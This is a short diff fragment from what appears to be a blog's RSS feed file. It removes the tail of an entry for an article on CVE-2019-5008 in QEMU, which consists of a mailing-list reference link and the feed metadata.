-     &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;valid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;
-&lt;div class=&quot;footnotes&quot;&gt;
-  &lt;ol&gt;
-    &lt;li id=&quot;fn:1&quot;&gt;
-      &lt;p&gt;&lt;a href=&quot;https://lists.gnu.org/archive/html/qemu-devel/2019-01/msg00186.html&quot;&gt;https://lists.gnu.org/archive/html/qemu-devel/2019-01/msg00186.html&lt;/a&gt; &lt;a href=&quot;#fnref:1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
-    &lt;/li&gt;
-  &lt;/ol&gt;
-&lt;/div&gt;
-</description>
-        <pubDate>2020-05-19</pubDate>
-        <link>http://localhost:4000/articles/2019-01/CVE-2019-5008</link>
-        <guid isPermaLink="true">http://localhost:4000/articles/2019-01/CVE-2019-5008</guid>
         
         <category>qemu</category>
         
